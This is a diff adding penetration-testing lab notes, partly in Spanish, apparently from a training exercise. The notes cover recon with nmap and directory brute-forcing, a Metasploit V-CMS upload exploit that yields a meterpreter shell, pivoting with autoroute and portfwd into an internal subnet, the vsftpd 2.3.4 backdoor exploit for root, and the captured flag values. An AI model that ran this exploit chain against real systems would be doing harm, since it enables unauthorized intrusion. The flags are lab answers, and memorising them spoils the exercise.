@@ -1,0 +1,100 @@
+192.55.118.3
+demo.ine.local
+ttl 63
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx 1.14.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: V-CMS-Powered by V-CMS
+|_http-server-header: nginx/1.14.0
+3306/tcp open  mysql   MySQL (unauthorized)
+MAC Address: 02:42:C0:37:76:03 (Unknown)
+
+
+/images               (Status: 301) [Size: 185] [--> http://192.55.118.3/images/]
+/css                  (Status: 301) [Size: 185] [--> http://192.55.118.3/css/]
+/includes             (Status: 301) [Size: 185] [--> http://192.55.118.3/includes/]
+/install              (Status: 301) [Size: 185] [--> http://192.55.118.3/install/]
+/temp                 (Status: 301) [Size: 185] [--> http://192.55.118.3/temp/]  
+
+
+VCMS v1.0
+msf6 exploit(linux/http/vcms_upload) > exploit
+meterpreter > cat flag.txt
+4f96a3e848d233d5af337c440e50fe3d
+
+meterpreter > cat /etc/hosts
+127.0.0.1       localhost
+192.5.127.3    demo.ine.local demo  >>> IP_TRAGET_1
+192.133.243.2   demo.ine.local demo  >>> IP_TARGET_2
+
+[+]PIVOTING[+]
+No podemos acceder al rango de IP 192.133.243.0/24 desde la máquina Kali. Para acceder a esta red desde Kali, necesitamos realizar un pivote.
+Use el comando "autoroute" para agregar una ruta a un rango de IP inalcanzable.
+Este comando se usa para agregar rutas específicas de sesión de meterpreter a la tabla de enrutamiento de Metasploit. Estas rutas se pueden utilizar para pasar a la red que de otro modo sería inalcanzable.
+
+Agregue la ruta al rango de IP 192.133.243.0/24
+meterpreter > run autoroute -s 192.133.243.0 -n 255.255.255.0
+
+Ponga en segundo plano la sesión de meterpreter y verifique si la ruta se agregó correctamente a la tabla de enrutamiento de metasploit.
+meterpreter > background
+mfs > route print
+
+Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.133.243.0      255.255.255.0      Session 1
+   
+
+The route is added successfully. We could use the "route" command to add the routing table to the metasploit framework.
+msf > route add 192.133.243.0 255.255.255.0 1
+[*] Route already exists
+
+Ejecutaremos el módulo auxiliar de escaneo de puertos TCP para descubrir cualquier host disponible (desde IP 192.133.243.0 a .10). Y, si alguno de los puertos 80, 8080, 445, 21 y 22 están abiertos en esos hosts.
+
+msf > auxiliary(scanner/portscan/tcp) > 
+msf6 auxiliary(scanner/portscan/tcp) > set RHOST 192.133.243.0-5
+RHOST => 192.133.243.0-5 (en este caso particular prefiero ir de 5 en 5 para tardar menos, si fuera necesario se modifica a .10)
+msf6 auxiliary(scanner/portscan/tcp) > set THREADS 5
+THREADS => 5
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21-25,80,8080,443,3360
+PORTS => 21-25,80,8080,443,3360
+msf6 auxiliary(scanner/portscan/tcp) > 
+
+[+] 192.133.243.3:        - 192.133.243.3:21 - TCP OPEN
+[+] 192.133.243.1:        - 192.133.243.1:22 - TCP OPEN
+[+] 192.133.243.2:        - 192.133.243.2:80 - TCP OPEN
+
+[+]PORTFORWARDING[+]
+Volvemos a la session de meterpreter con la primera maquina comprometida
+Forwarding the remote port to local port.
+
+meterpreter > portfwd add  -l 1234 -p 21 -r 192.133.243.3 (-l puede ser cualquie puerto que no este en uso en nuestra maquina)
+-l local port (numero de puerto que nos vamos a llevar a nuestra maquina)
+-p remote port (el numero de puerto de la maquina victima)
+-r remote host (ip de la victima)
+
+meterpreter > portfwd list  (comprobamos si se ha completado con exito)
+Index  Local             Remote        Direction
+   -----  -----             ------        ---------
+   1      :21  0.0.0.0:1234  Forward
+
+Running nmap on the forwarded local port to identify the service name.
+De otra manera el output seria algo pareciado a : PORT 21 Service filetered/tcpwrapped sin version.
+msf6 > nmap -sC -sV -p1234 localhost
+PORT     STATE SERVICE VERSION
+1234/tcp open  ftp     vsftpd 2.0.8 or later
+Service Info: Host: Welcome
+
+[+]exploit service vsftpd[+]
+exploit/unix/ftp/vsftpd_234_backdoor  VSFTPD v2.3.4 Backdoor Command Execution
+
+set RHOST 192.133.243.3
+set RPORT 21
+exploit
+
+[+] 192.133.243.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+cat flag.txt
+58c7c29a8ab5e7c4c06256b954947f9a
